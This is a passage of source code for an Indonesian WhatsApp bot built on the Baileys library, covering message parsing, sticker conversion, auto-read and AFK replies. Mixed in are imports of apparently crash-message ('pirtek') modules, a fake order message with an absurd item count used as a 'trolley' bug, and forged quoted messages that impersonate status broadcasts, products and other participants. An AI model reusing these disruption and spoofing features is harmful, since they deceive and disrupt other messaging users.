const {
	WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	relayWAMessage
	} = require("@adiwajshing/baileys")
const hx = require('hxz-api')
const zn = require('xnz-scrap/xznphoto.js')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const simple = require('./lib/simple.js')
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { bugweb } = require('./database/pirtek/bugweb.js')
const { bersihin } = require('./database/pirtek/bersihin.js')
const { iphone } = require('./database/pirtek/iphone.js')
const { vapi } = require('./database/pirtek/vapi.js')
const { catalog } = require('./database/pirtek/catalog.js')
const { judul } = require('./database/pirtek/judul.js')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const yntkts = require('./lib/settings.json')
const { latx, latx2 } = require('./database/latx')

let commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
let antitoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let _scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
let antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
let setiker = JSON.parse(fs.readFileSync('./database/temp/stik.json'))
let audionye = JSON.parse(fs.readFileSync('./database/temp/vn.json'))
let imagenye = JSON.parse(fs.readFileSync('./database/temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./database/temp/video.json'))
const namalu = yntkts.namalu
banChats = false
fakevn = false
offline = false
antical = false
readG = false
autorespon = true
readP = false
targetpc = '0'
pref = '?'
multi = true
const fake = yntkts.namalu
const fake1 = yntkts.namalu
const nomerOwner = yntkts.nomerOwner
const hardianto = yntkts.hardianto
const namaludua = yntkts.namaludua
const ZeksApi = yntkts.ZeksApi
const namalutiga = yntkts.namalutiga
const nikokontol = yntkts.nikokontol
ownerNumber = [`${nomerOwner}`]
const express = require("express");    
const cors = require("cors");
const y = require("body-parser");
const app = express();
app.use(cors());
app.use(y.json({ limit: "10000kb", extended: true }));
app.use(y.urlencoded({ limit: "10000kb", extended: true }));
numbernye = '0'
ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
waktu = '-'
alasan = '-'

var _0x7dfa=["\x70\x75\x73\x68","\x2E\x2F\x64\x61\x74\x61\x62\x61\x73\x65\x2F\x73\x63\x6F\x6D\x6D\x61\x6E\x64\x2E\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x77\x72\x69\x74\x65\x46\x69\x6C\x65\x53\x79\x6E\x63","\x69\x64","\x66\x6F\x72\x45\x61\x63\x68","\x6B\x65\x79\x73","\x63\x68\x61\x74\x73"];const addCmd=(_0x69b2x2,_0x69b2x3)=>{const _0x69b2x4={id:_0x69b2x2,chats:_0x69b2x3};_scommand[_0x7dfa[0]](_0x69b2x4);fs[_0x7dfa[3]](_0x7dfa[1],JSON[_0x7dfa[2]](_scommand))};const getCommandPosition=(_0x69b2x2)=>{let _0x69b2x6=null;Object[_0x7dfa[6]](_scommand)[_0x7dfa[5]]((_0x69b2x7)=>{if(_scommand[_0x69b2x7][_0x7dfa[4]]=== _0x69b2x2){_0x69b2x6= _0x69b2x7}});if(_0x69b2x6!== null){return _0x69b2x6}};const getCmd=(_0x69b2x2)=>{let _0x69b2x6=null;Object[_0x7dfa[6]](_scommand)[_0x7dfa[5]]((_0x69b2x7)=>{if(_scommand[_0x69b2x7][_0x7dfa[4]]=== _0x69b2x2){_0x69b2x6= _0x69b2x7}});if(_0x69b2x6!== null){return _scommand[_0x69b2x6][_0x7dfa[7]]}};const checkSCommand=(_0x69b2x2)=>{let _0x69b2xa=false;Object[_0x7dfa[6]](_scommand)[_0x7dfa[5]]((_0x69b2x7)=>{if(_scommand[_0x69b2x7][_0x7dfa[4]]=== _0x69b2x2){_0x69b2xa= true}});return _0x69b2xa}

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = '夜 🌌'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = '夜 🌇'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = '午後 🌅'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = '午後 🏞️'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = '朝 🌄'
                                         }
if(time2 < "06:00:00"){
var ucapanWaktu = '朝 🌆'                                       }
//=================================================//
module.exports = thunderx7 = async (thunderx7, thunder) => {
	try {
        if (!thunder.hasNewMessage) return
        thunder = thunder.messages.all()[0]
		if (!thunder.message) return
		if (thunder.key && thunder.key.remoteJid == 'status@broadcast') return
		global.blocked
        	// thunder.message = (Object.keys(thunder.message)[0] === 'ephemeralMessage') ? thunder.message.ephemeralMessage.message : thunder.message
        	const content = JSON.stringify(thunder.message)
		const from = thunder.key.remoteJid
		thunder.message = (Object.keys(thunder.message)[0] === 'ephemeralMessage') ? thunder.message.ephemeralMessage.message : thunder.message
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
               
               //objek
               const type = Object.keys(thunder.message)[0]       
		      var pes = (type === 'conversation' && thunder.message.conversation) ? thunder.message.conversation : (type == 'imageMessage') && thunder.message.imageMessage.caption ? thunder.message.imageMessage.caption : (type == 'videoMessage') && thunder.message.videoMessage.caption ? thunder.message.videoMessage.caption : (type == 'extendedTextMessage') && thunder.message.extendedTextMessage.text ? thunder.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
 const messagesC = pes.slice(0).trim()
 const cmd = (type === 'conversation' && thunder.message.conversation) ? thunder.message.conversation : (type == 'imageMessage') && thunder.message.imageMessage.caption ? thunder.message.imageMessage.caption : (type == 'videoMessage') && thunder.message.videoMessage.caption ? thunder.message.videoMessage.caption : (type == 'extendedTextMessage') && thunder.message.extendedTextMessage.text ? thunder.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
 const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
body = (type === 'conversation' && thunder.message.conversation.startsWith(prefix)) ? thunder.message.conversation : (type == 'imageMessage') && thunder.message.imageMessage.caption.startsWith(prefix) ? thunder.message.imageMessage.caption : (type == 'videoMessage') && thunder.message.videoMessage.caption.startsWith(prefix) ? thunder.message.videoMessage.caption : (type == 'extendedTextMessage') && thunder.message.extendedTextMessage.text.startsWith(prefix) ? thunder.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(thunder.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(thunder.message.stickerMessage.fileSha256.toString('hex')) !== undefined) ? (getCmd(thunder.message.stickerMessage.fileSha256.toString('hex')).startsWith(prefix) ? getCmd(thunder.message.stickerMessage.fileSha256.toString('hex')) : '') : ""
bodylist = (type === 'listResponseMessage' && thunder.message.listResponseMessage.title) ? thunder.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && thunder.message.buttonsResponseMessage.selectedButtonId) ? thunder.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && thunder.message.conversation.startsWith(prefix)) ? thunder.message.conversation : (type == 'imageMessage') && thunder.message.imageMessage.caption.startsWith(prefix) ? thunder.message.imageMessage.caption : (type == 'videoMessage') && thunder.message.videoMessage.caption.startsWith(prefix) ? thunder.message.videoMessage.caption : (type == 'extendedTextMessage') && thunder.message.extendedTextMessage.text.startsWith(prefix) ? thunder.message.extendedTextMessage.text : "" && (type === 'conversation') ? thunder.message.conversation : (type === 'extendedTextMessage') ? thunder.message.extendedTextMessage.text : ''
			budyanti = (type === 'conversation') ? thunder.message.conversation : (type === 'extendedTextMessage') ? thunder.message.extendedTextMessage.text : ''
budy = (type === 'conversation' && thunder.message.conversation.startsWith(prefix)) ? thunder.message.conversation : (type == 'imageMessage') && thunder.message.imageMessage.caption.startsWith(prefix) ? thunder.message.imageMessage.caption : (type == 'videoMessage') && thunder.message.videoMessage.caption.startsWith(prefix) ? thunder.message.videoMessage.caption : (type == 'extendedTextMessage') && thunder.message.extendedTextMessage.text.startsWith(prefix) ? thunder.message.extendedTextMessage.text : ''
			hasileval = (type === 'conversation') ? thunder.message.conversation : (type === 'extendedTextMessage') ? thunder.message.extendedTextMessage.text : ''
buttonanthunder = (type === 'listResponseMessage' && thunder.message.listResponseMessage.title) ? thunder.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && thunder.message.buttonsResponseMessage.selectedButtonId) ? thunder.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && thunder.message.conversation.startsWith(prefix)) ? thunder.message.conversation : (type == 'imageMessage') && thunder.message.imageMessage.caption.startsWith(prefix) ? thunder.message.imageMessage.caption : (type == 'videoMessage') && thunder.message.videoMessage.caption.startsWith(prefix) ? thunder.message.videoMessage.caption : (type == 'extendedTextMessage') && thunder.message.extendedTextMessage.text.startsWith(prefix) ? thunder.message.extendedTextMessage.text : "" && (type === 'conversation') ? thunder.message.conversation : (type === 'extendedTextMessage') ? thunder.message.extendedTextMessage.text : ''
responderthunder = (type === 'conversation') ? thunder.message.conversation : (type === 'extendedTextMessage') ? thunder.message.extendedTextMessage.text : ''
       evalngek = (type === 'conversation') ? thunder.message.conversation : (type === 'extendedTextMessage') ? thunder.message.extendedTextMessage.text : ''
 budyeval = (type === 'conversation') ? thunder.message.conversation : (type === 'extendedTextMessage') ? thunder.message.extendedTextMessage.text : ''
button = (type == 'buttonsResponseMessage') ? thunder.message.buttonsResponseMessage.selectedDisplayText : ''
        isImage = (type === 'imageMessage')
        listmes = (type == 'listResponseMessage') ? thunder.message.listResponseMessage.title : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		// const body = (type === 'listResponseMessage' && thunder.message.listResponseMessage.title) ? thunder.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && thunder.message.buttonsResponseMessage.selectedButtonId) ? thunder.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && thunder.message.conversation.startsWith(prefix)) ? thunder.message.conversation : (type == 'imageMessage') && thunder.message.imageMessage.caption.startsWith(prefix) ? thunder.message.imageMessage.caption : (type == 'videoMessage') && thunder.message.videoMessage.caption.startsWith(prefix) ? thunder.message.videoMessage.caption : (type == 'extendedTextMessage') && thunder.message.extendedTextMessage.text.startsWith(prefix) ? thunder.message.extendedTextMessage.text : ""
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		chatss = (type === 'conversation') ? thunder.message.conversation : (type === 'extendedTextMessage') ? thunder.message.extendedTextMessage.text : ''
		const arg = chatss.slice(command.length + 2, chatss.length)

		const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
		const botNumber = thunderx7.user.jid
		const botNumberss = thunderx7.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = thunder.key.fromMe ? thunderx7.user.jid : isGroup ? thunder.participant : thunder.key.remoteJid
		const isOwner = ownerNumber.includes(sender)
		const totalchat = await thunderx7.chats.all()
		const groupMetadata = isGroup ? await thunderx7.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const isToxic = isGroup ? antitoxic.includes(from) : false
        const AntiVirtex = isGroup ? antivirtex.includes(from) : false
        const conts = thunder.key.fromMe ? thunderx7.user.jid : thunderx7.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = thunder.key.fromMe ? thunderx7.user.name : conts.notify || conts.vname || conts.name || '-'
        m = simple.smsg(thunderx7, thunder)
        const sendStickerUrl = async(to, url) => {
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
var names = getRandom('.webp')
var namea = getRandom('.png')
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, namea, async function () {
let filess = namea
let asw = names
require('./database/stik/exif.js')
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
let media = fs.readFileSync(asw)
thunderx7.sendMessage(from, media, sticker, {quoted: thunder})
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))  
});
});
});
}
        const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + 'FN:Orang\n'
            + 'TEL;type=CELL;type=VOICE;waid=6285333831716:+6285333831716\n' 
            + 'END:VCARD'
        chatss = (type === 'conversation') ? thunder.message.conversation : (type === 'extendedTextMessage') ? thunder.message.extendedTextMessage.text : ''

        //MESS
		mess = {
			wait: 'Sabar yyy',
			admin: 'Ndak admin',
			owner: 'YNTKTS',
			success: 'Done',
			wrongFormat: 'Baca format',
			error: {
				stick: 'Disuruh stiker lu bikin apa',
				Iv: 'emlol link'
			},
			only: {
				group: 'Bukan grup',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        //troliv2
const troli2 = () => {
             kontol = thunderx7.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 292919, "thumbnail": fs.readFileSync(`./database/pirtek/thunder.jpeg`), "orderTitle": "𝑇𝐻𝑈𝑁𝐷𝐸𝑅 𝑋7 𝑍𝑁𝑋 𝑆𝑌𝑁𝐷𝐼𝐶𝐴𝑇𝐸 ", "message":"𝑇𝐻𝑈𝑁𝐷𝐸𝑅 𝑋7 𝑍𝑁𝑋 𝑆𝑌𝑁𝐷𝐼𝐶𝐴𝑇𝐸","surface": 'CATALOG' }}, {quoted:thunder})
             thunderx7.relayWAMessage(kontol)
        }
        //FAKEREPLY PRODUCT
            const ftoko = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./database/stik/thumb.jpeg`)},"title": `BUKTI????\n${pushname}`,"description": "YAHAHA", "currencyCode": "IDR","priceAmount1000": "28","retailerId": "Who Is Thunder?","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
            //FAKE KONTAK
const fkontak = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
                      //FAKE VN
            const fvn = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "191919191","ptt": "true"}}}
            //FAKE TEXT
            const ftext = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `:V`,'jpegThumbnail': fs.readFileSync('./database/stik/thumb.jpeg')}}}
            //FAKE LIVE ACTION
            const floc2 = {
                  key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
            //FAKEREPLY TROLI
            const ftroli = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 19199101002,status: 1,surface : 1,message: `${fake}`,orderTitle: '𝐼𝑡𝑠 𝑀𝑒 𝑇ℎ𝑢𝑛𝑑𝑒𝑟',thumbnail: fs.readFileSync('./database/stik/thumb.jpeg'), sellerJid: '0@s.whatsapp.net'}}}
            //FAKEREPLY VIDEO
            const fvideo = {
                  key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"Minggir","h": `Hmm`,'seconds': '28282828', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./database/stik/thumb.jpeg')}}}
            //FAKEREPLY GROUPINVITE
            const fgc = {
                  key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./database/stik/thumb.jpeg')}}}
            //FAKEREPLY GIF
            const fgif = {
                  key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./database/stik/thumb.jpeg')}}} 
            //freply by me
const freplythunder = { key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, message: { documentMessage: { 'jpegThumbnail': fs.readFileSync('./database/stik/thumb.jpeg'), mimetype: "application/octet-stream",title: "@thunderx7", fileLength: "30", pageCount: 0, fileName: `${fake}`}}, messageTimestamp: "1614069378", status: "PENDING"}
       
       const replylinkyt = (teks) => {
			thunderx7.sendMessage(from, teks, text, { quoted: freplythunder, contextInfo: { externalAdReply:{title:`Hiii ${pushname}`,body:"",mediaType:"2", mediaUrl:`https://youtu.be/U3e4g2kMplA`}}})
		}
 const reply = (teks) => {
      thunderx7.sendMessage(from, teks, text, { thumbnail: fs.readFileSync(`./database/stik/thumb.jpeg`), quoted: thunder, contextInfo: { externalAdReply:{title: `${namaludua}`,body: `${namalutiga}`,previewType:"PHOTO",thumbnail: fs.readFileSync(`./database/stik/thumb.jpeg`),sourceUrl:`https://google.com`}}})
    };
    
        const sendMess = (hehe, teks) => {
            thunderx7.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? thunderx7.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : thunderx7.sendMessage(from, teks.trim(), extendedText, { quoted: thunder, contextInfo: { "mentionedJid": memberr } })
        }
        const fakestatus = (teks) => {
            thunderx7.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./database/stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            thunderx7.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./database/stik/fake.jpeg'),quoted:thunder,caption:yes})
        }
        const fakegroup = (teks) => {
            thunderx7.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./database/stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './database/stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './database/stik' + names + '.png'
                    let asw = './database/stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        thunderx7.sendMessage(to, media, MessageType.sticker,{quoted:thunder})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            //responder
//
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    thunderx7.sendMessage(to, media, type, { quoted: thunder, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
            if (!isGroup && !isCmd && !command && !thunder.key.fromMe && !autorespon) {
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${arg}&lc=id`)
sami = simi.success
reply(`*_${sami}_*`)
console.log(color(`${sami}`))}
            //auto read
// Auto Read Group
var chats = await thunderx7.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await thunderx7.chatRead(jid)
})
// Auto Read Private
var chatss = await thunderx7.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readP === false) return
await thunderx7.chatRead(jid)
})
var prefi = pref
			
if (multi) {
    prefi = `Multi-Prefix`
}

       /*    var chats = await thunderx7.chats.array.filter(v => v.jid.endsWith('g.us'))
            chats.map( async ({ jid }) => {
            await thunderx7.chatRead(jid)
            }) 
            
            
            
               var chats = await thunderx7.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
            chats.map( async ({ jid }) => {
            await thunderx7.chatRead(jid)
            })  */
        
            //
            idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
	    }
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
    
            //AUTO RESPON
      for (let i = 0; i < commandsDB.length ; i++) {
      if (budy == commandsDB[i].pesan) {
      thunderx7.sendMessage(from, commandsDB[i].balasan, text, {quoted: thunder})
      }
      }
      
            //anti toxic
				if (budyanti.includes("kontol"))
if (budyanti.includes("ajg"))
if (budyanti.includes("methunder")) {
				if (!isGroup) return
				if (!isToxic) return
				if (isGroupAdmins) return
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(`Toxic kntl\nJika tidak terima silahkan pc admin dengan sopan terimakasih`)
				setTimeout(() => {
				thunderx7.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 0)
			    }
			//anti link
			//anti virus
    if (budyanti.length > 64000) {
    if (!isGroup) return
    if (!AntiVirtex) return
    if (isGroupAdmins) return
    reply('Tandai telah dibaca\n'.repeat(300))
    reply(`「 *HAH PILTEK?:V* 」\nGausah ngirim v anak kontol`)
    console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
    thunderx7.groupRemove(from, [sender])
    }
    // readgc
//FUNCTION
            cekafk(afk)
            if (!thunder.key.remoteJid.endsWith('@g.us') && offline){
            if (!thunder.key.fromMe){
            if (isAfk(thunder.key.remoteJid)) return
            addafk(thunder.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            thunderx7.sendMessage(thunder.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./database/stik/thumb.jpeg')}}}})
            }
            }   
        if (thunder.key.remoteJid.endsWith('@g.us') && offline) {
        if (!thunder.key.fromMe){
        if (thunder.message.extendedTextMessage != undefined){
        if (thunder.message.extendedTextMessage.contextInfo != undefined){
        if (thunder.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of thunder.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(thunder.key.remoteJid)) return
        addafk(thunder.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        thunderx7.sendMessage(thunder.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./database/stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
    
    //ban call

    // Yang Respon Itu Bang
   
    if (setiker.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./database/temp/stick/${namastc}.webp`)
	thunderx7.sendMessage(from, buffer, sticker, {quoted:thunder })
	}
	
	if (audionye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./database/temp/audio/${namastc}.mp3`)
	thunderx7.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: thunder, ptt: true })
